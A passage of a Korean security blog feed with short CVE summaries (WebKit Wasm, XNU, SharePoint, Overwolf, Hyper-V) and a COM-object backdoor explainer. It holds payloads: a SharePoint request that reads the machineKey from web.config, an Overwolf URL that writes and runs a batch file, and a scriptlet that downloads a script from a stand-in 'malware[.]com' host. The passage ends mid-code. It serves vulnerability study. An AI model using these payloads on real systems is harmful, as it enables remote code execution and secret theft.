<code>m_max_StackSize</code> í•„ë“œë¥¼ ì‚¬ìš©í•´ í•¨ìˆ˜ê°€ ì‚¬ìš©í•  ìŠ¤íƒì˜ ìµœëŒ€ í¬ê¸°ë¥¼ ì¶”ì í•©ë‹ˆë‹¤. íŒŒì‹±ì´ ëë‚˜ë©´ <code>m_max_StackSize</code> ê°’ì„ 16 byte alignmentë¡œ ë§ì¶”ê¸° ìœ„í•´ <code>LLIntGenerator::Finalize</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ ë°˜ì˜¬ë¦¼í•˜ê³  <code>m_numCalleeLocals</code> í•„ë“œì— ì €ì¥í•©ë‹ˆë‹¤. </p><p>ë§Œì•½ <code>m_max_StackSize</code> ê°’ì´ <code>0xffffffff</code>ì´ë¼ë©´ 16 byte alignmentë¥¼ ë§ì¶”ê¸° ìœ„í•´ ì˜¬ë¦¼ ê³„ì‚°ì„ í•˜ê²Œ ë˜ì–´ integer overflowê°€ ë°œìƒí•˜ê³  <code>m_numCalleeLocals</code>ì˜ ê°’ì´ <code>0x0</code>ìœ¼ë¡œ ì €ì¥ë©ë‹ˆë‹¤. í•¨ìˆ˜ê°€ ì‹¤ì œë¡œ ì‚¬ìš©í•˜ëŠ” ìŠ¤íƒì˜ í¬ê¸°ì™€ LLIntê°€ ì¶”ì í•˜ëŠ” í¬ê¸°ê°€ ì„œë¡œ ë‹¬ë¼ì§€ê²Œ ë˜ê³  ë©”ëª¨ë¦¬ ì˜¤ì—¼ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>safari</tag>
      
      <tag>wasm</tag>
      
      <tag>int overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-30660: macOS ë° iOSì˜ ì»¤ë„ ë©”ëª¨ë¦¬ ìœ ì¶œ ì·¨ì•½ì </title>
    <link href="/2021/06/04/l0ch/2021-06-04/"/>
    <url>/2021/06/04/l0ch/2021-06-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://support.apple.com/en-us/HT212325">macOS 11.3 ì´ì „ release</a></li><li><a href="https://support.apple.com/en-us/HT212317">iOS 14.5 ì´ì „ release</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Appleì‚¬ì˜ macOS ë° iOSì˜ XNU ì‹œìŠ¤í…œì—ì„œ ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>XNUì˜ syscall <code>SYS_msgsnd_nocancel</code> ì˜ í•¸ë“¤ëŸ¬ì¸ <a href="https://opensource.apple.com/source/xnu/xnu-1504.7.4/bsd/kern/sysv_msg.c.auto.html">sysv_msg.c/msgrcv_nocancel()</a> ëŠ” ìœ ì € ê³µê°„ì˜ ë©”ì‹œì§€ í¬ê¸°ë¥¼ <code>msgsz</code>ë¡œ ë°›ìŠµë‹ˆë‹¤. ë§Œì•½ ìœ ì € ê³µê°„ì—ì„œ ìš”ì²­ëœ í¬ê¸°ê°€ ì´ˆê¸°ì— ì»¤ë„ì— ì „ì†¡ëœ í¬ê¸° <code>msghdrâ†’msg_ts</code>ë³´ë‹¤ í¬ë©´ ì•„ë˜ì™€ ê°™ì´ <code>msghdrâ†’msg_ts</code>ë¡œ ìë¦…ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (msgsz &gt; msghdr-&gt;msg_ts) &#123;msgsz = msghdr-&gt;msg_ts;&#125;</code></pre><p>ì´í›„ ì•„ë˜ì˜ ë°˜ë³µë¬¸ì„ ëŒë©° ì»¤ë„ <code>msgpool</code>ì˜ ë°ì´í„°ë¥¼ ìœ ì € ê³µê°„ìœ¼ë¡œ ë³µì‚¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-number">1</span><span class="hljs-comment">// msg.h</span><span class="hljs-number">2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSGSSZ8<span class="hljs-comment">/* Each segment must be 2^N long */</span></span><span class="hljs-number">3</span><span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">msginit</span><span class="hljs-params">(__unused <span class="hljs-keyword">void</span> *dummy)</span></span>&#123;<span class="hljs-number">5</span><span class="hljs-keyword">if</span> (i != msginfo.msgssz) &#123;<span class="hljs-number">6</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;msginfo.msgssz=%d (0x%x) not a small power of 2; resetting to %d\\n&quot;</span>, msginfo.msgssz, msginfo.msgssz, MSGSSZ); <span class="hljs-number">7</span>msginfo.msgssz = MSGSSZ;<span class="hljs-number">8</span>&#125;<span class="hljs-number">9</span>...<span class="hljs-number">10</span><span class="hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msgsnd_nocancel</span><span class="hljs-params">(struct proc *p, struct msgsnd_nocancel_args *uap, <span class="hljs-keyword">int32_t</span> *retval)</span></span>&#123;<span class="hljs-number">12</span>...<span class="hljs-number">13</span><span class="hljs-keyword">for</span> (len = <span class="hljs-number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;<span class="hljs-number">14</span><span class="hljs-keyword">size_t</span> tlen;<span class="hljs-number">15</span><span class="hljs-comment">/* compare input (size_t) value against restrict (int) value */</span><span class="hljs-number">16</span><span class="hljs-keyword">if</span> (msgsz &gt; (<span class="hljs-keyword">size_t</span>)msginfo.msgssz) &#123;<span class="hljs-number">17</span>tlen = msginfo.msgssz;<span class="hljs-number">18</span>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-number">19</span>tlen = msgsz;<span class="hljs-number">20</span>&#125;<span class="hljs-number">21</span><span class="hljs-keyword">if</span> (next &lt;= <span class="hljs-number">-1</span>) &#123;<span class="hljs-number">22</span>panic(<span class="hljs-string">&quot;next too low #3&quot;</span>);<span class="hljs-number">23</span>&#125;<span class="hljs-number">24</span><span class="hljs-keyword">if</span> (next &gt;= msginfo.msgseg) &#123;<span class="hljs-number">25</span>panic(<span class="hljs-string">&quot;next out of range #3&quot;</span>);<span class="hljs-number">26</span>&#125;<span class="hljs-number">27</span>SYSV_MSG_SUBSYS_UNLOCK();<span class="hljs-number">28</span>eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen);<span class="hljs-number">29</span>...</code></pre><p>ë°˜ë³µë¬¸ì˜ ì¦ê°€ ê°’ì¸ <code>msginfo.msgssz</code>ëŠ” <code>msginit()</code>ì—ì„œ <code>#define MSGSSZ 8</code> ë¡œ ì„ ì–¸ëœ <code>MSGSSZ</code>ë¡œ ì´ˆê¸°í™”ë˜ì–´ íŠ¹ì • ì¡°ê±´ì„ ë§Œì¡±í•˜ë©´ <code>8 bytes</code> ë‹¨ìœ„ë¡œ ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ìœ ì € ê³µê°„ì— ë³µì‚¬í•˜ëŠ”ë°, ì´ë•Œ ìš”ì²­ëœ í¬ê¸°ê°€ 8ì˜ ë°°ìˆ˜ê°€ ì•„ë‹ ê²½ìš° ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ <code>1~7 bytes</code> í¬ê¸°ì˜ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>9 bytes</code> í¬ê¸°ì˜ <code>SYS_msgsnd_nocancel</code> syscallì„ ë³´ë‚¼ ê²½ìš° ì·¨ì•½ì ì€ ë‹¤ìŒê³¼ ê°™ì´ íŠ¸ë¦¬ê±° ë©ë‹ˆë‹¤.</p><ol><li><code>msghdrâ†’msg_ts</code>ì™€ <code>msgsz</code>ê°€ 9ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.</li><li>line 16ì˜ ì¡°ê±´ë¬¸ì— ì˜í•´  <code>tlen</code>ì´ 8ì´ ë©ë‹ˆë‹¤.</li><li><code> 8 bytes</code> ë‹¨ìœ„ë¡œ ë³µì‚¬í•˜ëŠ” ë°˜ë³µë¬¸ì„ ë‘ ë²ˆ ìˆ˜í–‰í•©ë‹ˆë‹¤.</li><li><code>16 bytes</code>ì˜ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ ìœ ì € ê³µê°„ìœ¼ë¡œ ë³µì‚¬ë˜ì–´ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ <code>7 bytes</code> í¬ê¸°ì˜ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ ìœ ì¶œë©ë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>kernel</tag>
      
      <tag>ios</tag>
      
      <tag>information disclosure</tag>
      
      <tag>L0ch</tag>
      
      <tag>apple</tag>
      
      <tag>macos</tag>
      
      <tag>xnu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-31181: Microsoft SharePoint ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/06/03/idioth/2021-06-03/"/>
    <url>/2021/06/03/idioth/2021-06-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">CVE-2021-31181: MICROSOFT SHAREPOINT WEBPART INTERPRETATION CONFLICT REMOTE CODE EXECUTION VULNERABILITY</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021ë…„ 5ì›” 11ì¼ ë¦´ë¦¬ìŠ¤ ì´ì „ ë²„ì „ì˜ Microsoft SharePoint<ul><li>Foundation 2013 Service Pack 1</li><li>Server 2019</li><li>Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePointì—ì„œ ì¸ì¦ëœ ì‚¬ìš©ìê°€ SharePointì˜ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„œë¹„ìŠ¤ ê³„ì • contextì—ì„œ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ 5ì›”ì— íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ <code>EditingPageParser.VerifyControlOnSafeList()</code> ë©”ì†Œë“œì—ì„œ ì‚¬ìš©ì ì…ë ¥ ê°’ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ ë°œìƒí•©ë‹ˆë‹¤. ì´ ë©”ì†Œë“œëŠ” unsafe controls ë¦¬ìŠ¤íŠ¸ì™€ ì‚¬ìš©ìì˜ ì…ë ¥ ê°’ì„ ë¹„êµí•˜ì—¬ í™•ì¸í•˜ë©° <code>web.config</code>ì— ì§€ì •ëœ <code>SafeControl</code>ì— ì˜í•´ ì•ˆì „í•œ ì»¨íŠ¸ë¡¤ì´ ì—†ëŠ” ê²½ìš° ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì´ ì¡´ì¬í•©ë‹ˆë‹¤. <code>EditingPageParser.ParseStringInternal()</code>ì€ ì‚¬ìš©ì ì…ë ¥ ê°’(<code>dscXml</code>)ì„ êµ¬ë¬¸ ë¶„ì„í•˜ê³  <code>hashtable</code>ì„ Register directive ì •ë³´ë¡œ ì±„ìš´ ë‹¤ìŒ ì„œë²„ ì»¨íŠ¸ë¡¤ì„ ë‚˜íƒ€ë‚´ëŠ” íƒœê·¸ë¡œ <code>hashtable2</code>ë¥¼ ì±„ì›ë‹ˆë‹¤. ê·¸ í›„ <code>hashtable2</code>ì˜ ê° ìš”ì†Œì— ëŒ€í•´ <code>Type</code> ê°ì²´ë¥¼ ìƒì„±í•˜ê³  <code>SafeControls</code>ì˜ allowed listì™€ ë¹„êµí•˜ì—¬ í™•ì¸í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ <code>Type</code>ì„ í™•ì¸í•  ìˆ˜ ì—†ì„ ë•Œ ì„œë²„ ì»¨íŠ¸ë¡¤ íƒœê·¸ê°€ ë¬´ì‹œë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ <code>WebPartPagesWebService.RenderWebPartForEdit</code> ì›¹ API ë©”ì†Œë“œë¡œ <code>/_vti_bin/webPartPages.asmx</code> ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>aspx</code>ë¥¼ ì…ë ¥ ê°’ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ <code>EditPageParser.VerifyControlOnSafeList</code>ë¥¼ ì‚¬ìš©í•´ í™•ì¸ í›„ unsafe elementê°€ ì—†ìœ¼ë©´ ë””ìì¸ ëª¨ë“œì—ì„œ ë§ˆí¬ì—…ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì´ë•Œ <code>RenderWebPartForEdit</code>ì˜ requestëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;WebPartPages&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;Microsoft.SharePoint.WebPartPage&quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot;</span> %&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;att&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;System.Web.UI.WebControls &quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>%&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WebPartPages:XsltListFormWebPart</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id01&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">ListDisplayName</span>=<span class="hljs-string">&quot;Documents&quot;</span> <span class="hljs-attr">WebId</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;6e7040c8-0338-4448-914d-a7061e0fc347&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">att:xmldatasource</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;XDS1&quot;</span> </span></span><span class="xml">      XPath=&quot;/configuration/system.web/machineKey&quot; </span><span class="xml">      datafile=&quot;c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config&quot; /&gt; </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span>          </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:output</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">indent</span>=<span class="hljs-string">&quot;yes&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span> &gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;.&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">WebPartPages:XsltListFormWebPart</span>&gt;</span></span></code></pre><p>ë”°ë¼ì„œ <code>web.config</code>ì˜ machinekey sectionì„ ì‚¬ìš©í•˜ì—¬ ì„œë²„ì—ì„œ <code>ViewState</code>ê°€ deserialize ë  ë•Œ ì„ì˜ì˜ OS ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” <code>VIEWSTATE</code> íŒŒë¼ë¯¸í„°ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-33501: Overwolf 1-Click Remote Code Execution</title>
    <link href="/2021/06/02/fabu1ous/2021-06-02/"/>
    <url>/2021/06/02/fabu1ous/2021-06-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swordbytes.com/blog/security-advisory-overwolf-1-click-remote-code-execution-cve-2021-33501/">Overwolf 1-Click Remote Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>OverwolfëŠ” PC ê²Œì„ì„ ìœ„í•œ í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ê°œë°œ í”„ë˜ì„ì›Œí¬ë¥¼ ì œê³µí•˜ê³  ìœ í†µí•˜ëŠ” í”Œë«í¼ì…ë‹ˆë‹¤. Overwolf Storeì˜ URL handlerì— Reflected Cross-Site Scripting(XSS)ì„ ì´ìš©í•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img src&#x3D;x onerror&#x3D;alert(document.location)&gt;&#x2F;4</code></pre><p><code>overwolfstore://</code> Custum Schemeë¥¼ ì‚¬ìš©í•˜ë©´ ì›¹ë¸Œë¼ìš°ì €ë¥¼ í†µí•´ OverwolfAppstore.exe í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. URLì˜ categoryì— í•´ë‹¹í•˜ëŠ” ë¶€ë¶„ì´ ì˜¤ë¥˜ ë©”ì„¸ì§€ì˜ ì¼ë¶€ë¡œ responce bodyì— reflect ë˜ë©° Overwolf Store UIì˜ DOMì— reflect ë˜ë¯€ë¡œ XSS ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img+src&#x3D;x+onerror&#x3D;%22overwolf.io.writeFileContents(&#39;C:\\windows\\temp\\d.bat&#39;,&#39;start%20cmd%20%252fk%20whoami&#39;,&#39;&#39;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&#39;C:\\windows\\temp\\d.bat&#39;)%22&gt;&#x2F;CCCCCC</code></pre><p>ìœ„ëŠ” PoC ì½”ë“œë¡œ ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ í•©ë‹ˆë‹¤.</p><ol><li>ëˆ„êµ°ê°€ ì•…ì„± URLì— ì ‘ì†í•˜ë©´ Overwolf Store ì‘ìš©í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ê³  XSS ì·¨ì•½ì  íŠ¸ë¦¬ê±°.</li><li><code>C:\windows\temp\</code> í´ë”ì— ì•…ì„± batch íŒŒì¼ ìƒì„±.</li><li>batch íŒŒì¼ ì‹¤í–‰</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
      <tag>sandbox escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-28476: Microsoft Hyper-Vì˜ Guest-to-Host RCE ì·¨ì•½ì </title>
    <link href="/2021/06/01/l0ch/2021-06-01/"/>
    <url>/2021/06/01/l0ch/2021-06-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-28476">CVE-2021-28476: a guest-to-host â€œMicrosoft Hyper-V Remote Code Execution Vulnerabilityâ€ in vmswitch.sys.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Hyper-V</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoftì˜ í•˜ì´í¼ë°”ì´ì € ê¸°ë°˜ ê°€ìƒí™” ì‹œìŠ¤í…œì¸ Hyper-Vì—ì„œ ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì´ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ìœ¼ë¡œ escape í•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ì˜ <code>vmswitch.sys</code> ë“œë¼ì´ë²„ì— ì¡´ì¬í•©ë‹ˆë‹¤. <code>vmswitch.sys</code>ëŠ” ê°€ìƒ íŒŒí‹°ì…˜ì´ ì¡´ì¬í•˜ëŠ” ì‹œìŠ¤í…œì—ì„œ íŒŒí‹°ì…˜ ê°„ í†µì‹ ì— ì‚¬ìš©ë˜ëŠ” ì±„ë„ ê¸°ë°˜ í†µì‹  ë©”ì»¤ë‹ˆì¦˜ì¸ <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/hyper-v-architecture">VMBus</a> ê¸°ëŠ¥ì„ ì§€ì›í•©ë‹ˆë‹¤. <code>vmswitch.sys</code>ì˜ <code>VmsIfrInfoParams_OID_SWITCH_NIC_REQUEST</code> í•¨ìˆ˜ì—ì„œëŠ” ì›ê²© <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/network/remote-ndis--rndis-2">NDIS(RNDIS)</a>  ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ”ë°, ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì—ì„œ ì•…ì„± RNDIS ìš”ì²­ì„ ë³´ë‚´ í•´ì»¤ê°€ ì œì–´í•˜ëŠ” ë°ì´í„°ë¡œ í˜¸ì¶œì´ ê°€ëŠ¥í•˜ê³  ì´ë¥¼ ì´ìš©í•´ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ì´ ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì˜ í¬ì¸í„°ë¥¼ ì—­ì°¸ì¡° í•˜ë„ë¡ í•©ë‹ˆë‹¤.</p><p>í•´ì»¤ëŠ” Hyper-Vì— Ubuntu focal ê²ŒìŠ¤íŠ¸ ë¨¸ì‹ ì„ ìƒì„±í•œ ë’¤ í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>microsoft</tag>
      
      <tag>L0ch</tag>
      
      <tag>hyper-v</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] COM ê°ì²´ë¥¼ í™œìš©í•œ ë°±ë„ì–´</title>
    <link href="/2021/05/31/idioth/2021-05-31/"/>
    <url>/2021/05/31/idioth/2021-05-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/maltrak/com-objects-p-1-the-hidden-backdoor-in-your-system-947ac4285e85">COM Objects P.1: The Hidden Backdoor in Your System</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì§€ë‚œ ëª‡ ë…„ê°„, í•´ì»¤ë“¤ì€ COM Objectì„ í†µí•´ fileless attack, defense ìš°íšŒ, í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ë¥¼ ìš°íšŒí•˜ê³  RPC í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ë‚´ë¶€ì— ì¹¨íˆ¬í•˜ê¸°ë„ í–ˆìŠµë‹ˆë‹¤. í•´ì»¤ë“¤ì´ COM ê°ì²´ë¥¼ í†µí•´ ê³µê²©ì„ ì§„í–‰í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p>ë¨¼ì € Initial Accessë¥¼ ìœ„í•œ COM ê°ì²´ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ì„œ í˜ì´ë¡œë“œë¥¼ ì „ì†¡í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. COM Scriptletì„ í†µí•´ ì•…ì„± ìë°”ìŠ¤í¬ë¦½íŠ¸ë‚˜ VBScriptë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>COMì„ í™œìš©í•˜ì—¬ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ëŠ” Scriptlet ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±ë©ë‹ˆë‹¤. ì²«ë²ˆì§¸ë¡œ Shellì— ì ‘ê·¼í•©ë‹ˆë‹¤.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span>&lt;![CDATA[<span class="javascript"><span class="hljs-keyword">var</span> malware = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;powershell.exe ...&quot;</span>);</span>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><code>ActiveXObject</code>ë¥¼ í†µí•´ <code>WScript.Shell</code>ì„ í˜¸ì¶œí•˜ì—¬ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  ê·¸ ë‹¤ìŒ ë„¤íŠ¸ì›Œí¬ í†µì‹ ì„ í†µí•´ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.</p><pre><code class="hljs js">net = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);net.Open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://malware[.]com/malware.js&quot;</span>, <span 